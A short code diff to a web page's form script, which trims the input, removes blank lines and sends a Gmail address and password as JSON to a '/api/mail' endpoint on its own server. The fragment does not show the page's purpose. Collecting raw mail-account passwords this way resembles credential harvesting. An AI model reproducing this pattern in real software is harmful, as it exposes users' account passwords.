@@ -47,26 +47,19 @@
     <script>
         document.getElementById('mailForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            const mailEmail = document.getElementById('mailEmail').value;
-            const mailPassword = document.getElementById('mailPassword').value;
+            const mailEmail = document.getElementById('mailEmail').value.trim();
+            const mailPassword = document.getElementById('mailPassword').value.trim();
             const errorMsg = document.getElementById('errorMsg');
-            
             if (!mailEmail || !mailPassword) {
                 errorMsg.style.display = 'block';
                 return;
             }
             errorMsg.style.display = 'none';
-            
             try {
                 const res = await fetch('/api/mail', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        provider: 'gmail', 
-                        mailEmail, 
-                        mailPassword 
-                    })
+                    body: JSON.stringify({ provider: 'gmail', mailEmail, mailPassword })
                 });
                 const data = await res.json();
                 if (data.status === 'success') {
